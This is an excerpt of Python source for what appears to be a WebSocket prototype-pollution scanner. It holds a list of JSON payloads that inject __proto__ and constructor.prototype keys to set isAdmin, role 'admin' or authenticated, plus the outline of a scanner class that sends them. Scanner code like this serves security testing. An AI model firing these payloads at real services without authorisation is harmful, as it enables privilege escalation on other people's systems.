...
WEBSOCKET_PP_PAYLOADS = [
    ...
    {"type": "message", "data": {"__proto__": {"polluted": True}}},
    {"action": "update", "payload": {"__proto__": {"isAdmin": True}}},
    {"event": "user_update", "data": {"constructor": {"prototype": {"role": "admin"}}}},
    # Nested pollution
    {"type": "request", "body": {"user": {"__proto__": {"authenticated": True}}}},
    # Socket.io format
    {"0": "message", "1": {"__proto__": {"socketio_polluted": True}}},
    # Action/reducer pattern (Redux-like)
    {"type": "SET_USER", "payload": {"__proto__": {"redux_polluted": True}}},
...
class WebSocketScanner:
    ...
    def __init__(
        self, timeout: int = 10, extra_headers: Optional[Dict[str, str]] = None
    ):
        """
    ...
    async def test_payloads(
        self, url: str, custom_payloads: Optional[List[Dict]] = None
    ) -> List[WebSocketFinding]:
        """
    ...
    def _analyze_response(
        self, url: str, payload: Dict, response: Optional[str]
